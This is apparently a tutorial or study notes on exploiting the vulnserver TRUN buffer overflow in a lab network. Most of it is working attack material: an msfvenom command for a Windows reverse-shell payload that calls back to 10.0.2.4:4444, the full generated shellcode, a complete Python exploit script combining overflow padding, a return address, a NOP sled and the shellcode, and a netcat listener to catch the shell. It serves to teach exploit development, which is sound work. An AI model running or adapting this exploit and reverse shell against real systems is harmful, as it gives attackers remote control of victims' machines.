# Generating Shell Code and getting Root

We will use `msfvenom` to create a payload

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.4 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
```

`-b` to specify which badchars we cannot use for our payload
Creating a reverse shell payload to connect back to us 
EXITFUNC=thread just makes our exploit a bit more stable

`-f` filetype for exporting our file in C

We get:
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
"\xbf\x2c\xe1\x5b\x01\xda\xc8\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x78\x12\x83\xe8\xfc\x03\x54\xef\xb9\xf4\x58\x07\xbf"
"\xf7\xa0\xd8\xa0\x7e\x45\xe9\xe0\xe5\x0e\x5a\xd1\x6e\x42\x57"
"\x9a\x23\x76\xec\xee\xeb\x79\x45\x44\xca\xb4\x56\xf5\x2e\xd7"
"\xd4\x04\x63\x37\xe4\xc6\x76\x36\x21\x3a\x7a\x6a\xfa\x30\x29"
"\x9a\x8f\x0d\xf2\x11\xc3\x80\x72\xc6\x94\xa3\x53\x59\xae\xfd"
"\x73\x58\x63\x76\x3a\x42\x60\xb3\xf4\xf9\x52\x4f\x07\x2b\xab"
"\xb0\xa4\x12\x03\x43\xb4\x53\xa4\xbc\xc3\xad\xd6\x41\xd4\x6a"
"\xa4\x9d\x51\x68\x0e\x55\xc1\x54\xae\xba\x94\x1f\xbc\x77\xd2"
"\x47\xa1\x86\x37\xfc\xdd\x03\xb6\xd2\x57\x57\x9d\xf6\x3c\x03"
"\xbc\xaf\x98\xe2\xc1\xaf\x42\x5a\x64\xa4\x6f\x8f\x15\xe7\xe7"
"\x7c\x14\x17\xf8\xea\x2f\x64\xca\xb5\x9b\xe2\x66\x3d\x02\xf5"
"\x89\x14\xf2\x69\x74\x97\x03\xa0\xb3\xc3\x53\xda\x12\x6c\x38"
"\x1a\x9a\xb9\xef\x4a\x34\x12\x50\x3a\xf4\xc2\x38\x50\xfb\x3d"
"\x58\x5b\xd1\x55\xf3\xa6\xb2\x53\x04\xaa\x46\x0c\x06\xaa\x57"
"\x90\x8f\x4c\x3d\x38\xc6\xc7\xaa\xa1\x43\x93\x4b\x2d\x5e\xde"
"\x4c\xa5\x6d\x1f\x02\x4e\x1b\x33\xf3\xbe\x56\x69\x52\xc0\x4c"
"\x05\x38\x53\x0b\xd5\x37\x48\x84\x82\x10\xbe\xdd\x46\x8d\x99"
"\x77\x74\x4c\x7f\xbf\x3c\x8b\xbc\x3e\xbd\x5e\xf8\x64\xad\xa6"
"\x01\x21\x99\x76\x54\xff\x77\x31\x0e\xb1\x21\xeb\xfd\x1b\xa5"
"\x6a\xce\x9b\xb3\x72\x1b\x6a\x5b\xc2\xf2\x2b\x64\xeb\x92\xbb"
"\x1d\x11\x03\x43\xf4\x91\x23\xa6\xdc\xef\xcb\x7f\xb5\x4d\x96"
"\x7f\x60\x91\xaf\x03\x80\x6a\x54\x1b\xe1\x6f\x10\x9b\x1a\x02"
"\x09\x4e\x1c\xb1\x2a\x5b";
```
Always note our payload size. Here 351 bytes. Useful for exploit development.


We add No Operation (NoOp) padding: "\x90" * 32, adding a bit of padding space between our buffer and the overflow. If we didn't have this, something could interfere and not let our exploit code run 

Our new, final script:
```
#!/usr/bin/python
import sys, socket

overflow = (
"\xbf\x2c\xe1\x5b\x01\xda\xc8\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x78\x12\x83\xe8\xfc\x03\x54\xef\xb9\xf4\x58\x07\xbf"
"\xf7\xa0\xd8\xa0\x7e\x45\xe9\xe0\xe5\x0e\x5a\xd1\x6e\x42\x57"
"\x9a\x23\x76\xec\xee\xeb\x79\x45\x44\xca\xb4\x56\xf5\x2e\xd7"
"\xd4\x04\x63\x37\xe4\xc6\x76\x36\x21\x3a\x7a\x6a\xfa\x30\x29"
"\x9a\x8f\x0d\xf2\x11\xc3\x80\x72\xc6\x94\xa3\x53\x59\xae\xfd"
"\x73\x58\x63\x76\x3a\x42\x60\xb3\xf4\xf9\x52\x4f\x07\x2b\xab"
"\xb0\xa4\x12\x03\x43\xb4\x53\xa4\xbc\xc3\xad\xd6\x41\xd4\x6a"
"\xa4\x9d\x51\x68\x0e\x55\xc1\x54\xae\xba\x94\x1f\xbc\x77\xd2"
"\x47\xa1\x86\x37\xfc\xdd\x03\xb6\xd2\x57\x57\x9d\xf6\x3c\x03"
"\xbc\xaf\x98\xe2\xc1\xaf\x42\x5a\x64\xa4\x6f\x8f\x15\xe7\xe7"
"\x7c\x14\x17\xf8\xea\x2f\x64\xca\xb5\x9b\xe2\x66\x3d\x02\xf5"
"\x89\x14\xf2\x69\x74\x97\x03\xa0\xb3\xc3\x53\xda\x12\x6c\x38"
"\x1a\x9a\xb9\xef\x4a\x34\x12\x50\x3a\xf4\xc2\x38\x50\xfb\x3d"
"\x58\x5b\xd1\x55\xf3\xa6\xb2\x53\x04\xaa\x46\x0c\x06\xaa\x57"
"\x90\x8f\x4c\x3d\x38\xc6\xc7\xaa\xa1\x43\x93\x4b\x2d\x5e\xde"
"\x4c\xa5\x6d\x1f\x02\x4e\x1b\x33\xf3\xbe\x56\x69\x52\xc0\x4c"
"\x05\x38\x53\x0b\xd5\x37\x48\x84\x82\x10\xbe\xdd\x46\x8d\x99"
"\x77\x74\x4c\x7f\xbf\x3c\x8b\xbc\x3e\xbd\x5e\xf8\x64\xad\xa6"
"\x01\x21\x99\x76\x54\xff\x77\x31\x0e\xb1\x21\xeb\xfd\x1b\xa5"
"\x6a\xce\x9b\xb3\x72\x1b\x6a\x5b\xc2\xf2\x2b\x64\xeb\x92\xbb"
"\x1d\x11\x03\x43\xf4\x91\x23\xa6\xdc\xef\xcb\x7f\xb5\x4d\x96"
"\x7f\x60\x91\xaf\x03\x80\x6a\x54\x1b\xe1\x6f\x10\x9b\x1a\x02"
"\x09\x4e\x1c\xb1\x2a\x5b")


# The "vulnerable" return address we found was 625011af
shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

while True:
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('10.0.2.15',9999))
		s.send(('TRUN /.:/' + shellcode ))
		s.close()
	except:
		print "Error connecting to server"
		sys.exit()
		
```

If we have limited space especially, might need to adjust the padding 

We will have to start a listener. Netcat:

```
nc -nvlp 4444
```

Run vulnserver and then run our exploit
GOT ROOT

